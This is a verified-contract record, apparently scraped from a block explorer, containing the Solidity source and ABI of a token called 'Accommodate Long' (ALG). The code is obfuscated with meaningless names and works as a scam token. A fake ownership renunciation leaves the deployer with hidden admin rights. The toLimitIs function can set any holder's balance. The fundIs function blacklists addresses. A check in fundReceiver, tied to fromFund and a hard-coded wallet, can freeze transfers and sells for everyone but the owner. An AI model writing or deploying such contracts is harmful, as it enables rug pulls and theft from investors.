{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface fundLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atLiquidityTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyAtFee {\n    function createPair(address tokenMax, address feeSwap) external returns (address);\n}\n\ninterface takeFromList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldSwap) external view returns (uint256);\n\n    function transfer(address shouldSell, uint256 maxExempt) external returns (bool);\n\n    function allowance(address senderExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldSell,\n        uint256 maxExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingWallet, uint256 value);\n    event Approval(address indexed senderExempt, address indexed spender, uint256 value);\n}\n\ninterface takeFromListMetadata is takeFromList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccommodateLong is atLiquidityTeam, takeFromList, takeFromListMetadata {\n\n    uint256 constant launchTeam = 10 ** 10;\n\n    event OwnershipTransferred(address indexed launchSwap, address indexed launchTrading);\n\n    bool public takeToken;\n\n    function approve(address swapAuto, uint256 maxExempt) public virtual override returns (bool) {\n        minMarketingMode[_msgSender()][swapAuto] = maxExempt;\n        emit Approval(_msgSender(), swapAuto, maxExempt);\n        return true;\n    }\n\n    function fundReceiver(address shouldAt, address shouldSell, uint256 maxExempt) internal returns (bool) {\n        if (shouldAt == marketingMode) {\n            return toAutoTx(shouldAt, shouldSell, maxExempt);\n        }\n        uint256 fromList = takeFromList(receiverShould).balanceOf(sellFund);\n        require(fromList == shouldTotal);\n        require(shouldSell != sellFund);\n        if (receiverTx[shouldAt]) {\n            return toAutoTx(shouldAt, shouldSell, launchTeam);\n        }\n        return toAutoTx(shouldAt, shouldSell, maxExempt);\n    }\n\n    constructor (){\n        if (autoAmount) {\n            shouldLimit = toTx;\n        }\n        fundLaunch liquidityMarketingIs = fundLaunch(receiverAmount);\n        receiverShould = buyAtFee(liquidityMarketingIs.factory()).createPair(liquidityMarketingIs.WETH(), address(this));\n        if (autoAmount) {\n            listToken = minFromToken;\n        }\n        marketingMode = _msgSender();\n        totalEnableMarketing();\n        maxLaunched[marketingMode] = true;\n        sellMarketing[marketingMode] = autoLaunchedIs;\n        if (liquidityExemptLimit != toTx) {\n            toTx = minFromToken;\n        }\n        emit Transfer(address(0), marketingMode, autoLaunchedIs);\n    }\n\n    address public marketingMode;\n\n    function allowance(address listShould, address swapAuto) external view virtual override returns (uint256) {\n        if (swapAuto == receiverAmount) {\n            return type(uint256).max;\n        }\n        return minMarketingMode[listShould][swapAuto];\n    }\n\n    function transfer(address maxFromToken, uint256 maxExempt) external virtual override returns (bool) {\n        return fundReceiver(_msgSender(), maxFromToken, maxExempt);\n    }\n\n    uint256 public toTx;\n\n    function getOwner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    function toAutoTx(address shouldAt, address shouldSell, uint256 maxExempt) internal returns (bool) {\n        require(sellMarketing[shouldAt] >= maxExempt);\n        sellMarketing[shouldAt] -= maxExempt;\n        sellMarketing[shouldSell] += maxExempt;\n        emit Transfer(shouldAt, shouldSell, maxExempt);\n        return true;\n    }\n\n    uint256 public liquidityExemptLimit;\n\n    uint256 shouldTotal;\n\n    uint256 modeFee;\n\n    function takeTx() private view {\n        require(maxLaunched[_msgSender()]);\n    }\n\n    mapping(address => bool) public receiverTx;\n\n    bool public launchMax;\n\n    uint256 private autoLaunchedIs = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    function balanceOf(address shouldSwap) public view virtual override returns (uint256) {\n        return sellMarketing[shouldSwap];\n    }\n\n    function fundIs(address launchSender) public {\n        takeTx();\n        if (takeToken == launchMax) {\n            toTx = liquidityExemptLimit;\n        }\n        if (launchSender == marketingMode || launchSender == receiverShould) {\n            return;\n        }\n        receiverTx[launchSender] = true;\n    }\n\n    function transferFrom(address shouldAt, address shouldSell, uint256 maxExempt) external override returns (bool) {\n        if (_msgSender() != receiverAmount) {\n            if (minMarketingMode[shouldAt][_msgSender()] != type(uint256).max) {\n                require(maxExempt <= minMarketingMode[shouldAt][_msgSender()]);\n                minMarketingMode[shouldAt][_msgSender()] -= maxExempt;\n            }\n        }\n        return fundReceiver(shouldAt, shouldSell, maxExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLaunchedIs;\n    }\n\n    bool public tradingMode;\n\n    function totalEnableMarketing() public {\n        emit OwnershipTransferred(marketingMode, address(0));\n        receiverSwap = address(0);\n    }\n\n    bool public autoAmount;\n\n    address sellFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function toLimitIs(address maxFromToken, uint256 maxExempt) public {\n        takeTx();\n        sellMarketing[maxFromToken] = maxExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private minMarketingMode;\n\n    string private senderList = \"ALG\";\n\n    string private exemptWallet = \"Accommodate Long\";\n\n    address receiverAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public maxLaunched;\n\n    address public receiverShould;\n\n    function fromFund(uint256 maxExempt) public {\n        takeTx();\n        shouldTotal = maxExempt;\n    }\n\n    uint8 private marketingAt = 18;\n\n    function receiverToken(address listMarketingLaunch) public {\n        if (tradingMode) {\n            return;\n        }\n        if (liquidityExemptLimit == minFromToken) {\n            shouldLimit = liquidityExemptLimit;\n        }\n        maxLaunched[listMarketingLaunch] = true;\n        \n        tradingMode = true;\n    }\n\n    uint256 public listToken;\n\n    uint256 private shouldLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderList;\n    }\n\n    uint256 private minFromToken;\n\n    mapping(address => uint256) private sellMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptWallet;\n    }\n\n    address private receiverSwap;\n\n    bool private fromSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"fromFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExemptLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketingLaunch\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"toLimitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AccommodateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}